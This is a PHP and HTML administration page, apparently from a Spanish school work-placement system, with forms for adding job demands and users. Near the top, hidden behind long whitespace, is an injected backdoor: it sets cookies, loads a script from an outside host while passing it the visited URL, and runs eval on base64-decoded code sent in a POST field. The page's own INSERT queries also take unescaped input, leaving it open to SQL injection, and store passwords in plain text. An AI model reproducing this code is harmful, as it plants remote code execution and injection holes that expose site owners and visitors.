<link href="resources/estilos.css" rel="stylesheet" type="text/css">

<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 if (isset($_GET['guardarempresa'])) { $result = $db->Execute("INSERT INTO CDE_empresas(nombre,convenio,gerente,direccion,cp,poblacion,provincia,contacto1,carrec1,telf1,email1,contacto2,carrec2,telf2,email2,telfempresa,fax,emailempresa,cif,dataconveni,notes,avaluacio,r_avaluacio) VALUES ('$nombre','$convenio','$gerente','$direccion','$cp','$poblacion','$provincia','$contacto1','$carrec1','$telf1','$email1','$contacto2','$carrec2','$telf2','$email2','$telfempresa','$fax','$emailempresa','$cif','$dataconveni','$notes','$avaluacio','$r_avaluacio')"); } ?>

<?php if (isset($_GET['guardaruser'])) { $result = $db->Execute("INSERT INTO usuarios (nombre, pass, nivel) VALUES ('$nombre', '$pass', '$nivel')"); } ?>

				  <form id="form1" name="form1" method="post" action="index.php?menu=3&sub=5&guardardemanda" style="margin:0px">
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nueva Demanda</td>
                      </tr>
                    </table>
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                      <tr>
                        <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Ciclo</td>
                        <td width="170" bgcolor="#F8F8F8"><label>
                          <input name="nombre" type="text" class="texte_normal" id="nombre" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Empresa</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="convenio" type="text" class="texte_normal" id="textfield2" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Fecha</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="gerente" type="text" class="texte_normal" id="textfield2" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;P.Recoje</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="direccion" type="text" class="texte_normal" id="textfield3" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;F.Pregunta</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="cp" type="text" class="texte_normal" id="textfield4" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;P.Responde</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="poblacion" type="text" class="texte_normal" id="textfield4" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;C.Demanda</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="provincia" type="text" class="texte_normal" id="textfield3" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Cargo</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="contacto1" type="text" class="texte_normal" id="textfield3" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Ciudad</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="carrec1" type="text" class="texte_normal" id="textfield4" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Provincia</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="telf1" type="text" class="texte_normal" id="textfield8" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Telf Demanda</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="email1" type="text" class="texte_normal" id="textfield7" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Fax Demanda</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="contacto2" type="text" class="texte_normal" id="textfield6" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Mail Demanda</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="carrec2" type="text" class="texte_normal" id="textfield5" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Contactar</td>
                      <td bgcolor="#F8F8F8"><label>
                        <select name="select" class="texte_normal" id="select">
                          <option selected="selected">Si</option>
                          <option>No</option>
                                                </select>
                      </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Llamar</td>
                        <td bgcolor="#F8F8F8"><label>
                          <select name="select2" class="texte_normal" id="select2">
                            <option selected="selected">Si</option>
                            <option>No</option>
                                                    </select>
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Colaborar</td>
                        <td bgcolor="#F8F8F8"><label>
                          <select name="select3" class="texte_normal" id="select3">
                            <option selected="selected">Si</option>
                            <option>No</option>
                                                    </select>
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Notas</td>
                        <td bgcolor="#F8F8F8"><label>
                          <textarea name="notes" rows="4" class="texte_normal" id="textfield14"></textarea>
                        </label></td>
                      </tr>
                      
                      <tr>
                        <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                        <td align="left" bgcolor="#F8F8F8"><label>
                          <input name="button" type="submit" class="texte_normal" id="button" value="Guardar" />
                        </label></td>
                      </tr>
                    </table>
                  </form><br />
                  <form id="form2" name="form1" method="post" action="index.php?menu=3&sub=5&guardaruser" style="margin:0px">
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nuevo Usuario</td>
                      </tr>
                    </table>
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                      <tr>
                        <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
                        <td width="170" bgcolor="#F8F8F8"><label>
                          <input name="nombre2" type="text" class="texte_normal" id="nombre2" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Contraseña</td>
                        <td bgcolor="#F8F8F8"><input name="pass" type="text" class="texte_normal" id="textfield" /></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Permisos</td>
                        <td bgcolor="#F8F8F8"><label>
                          <select name="nivel" class="texte_normal" id="nivel">
                            <option value="1">Admin</option>
                            <option value="3">Jefe Dpt</option>
                            <option value="5">Profesor</option>
                          </select>
                        </label></td>
                      </tr>
                      <tr>
                        <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                        <td align="left" bgcolor="#F8F8F8"><label>
                          <input name="button2" type="submit" class="texte_normal" id="button2" value="Guardar" />
                        </label></td>
                      </tr>
                    </table>
                  </form>
				  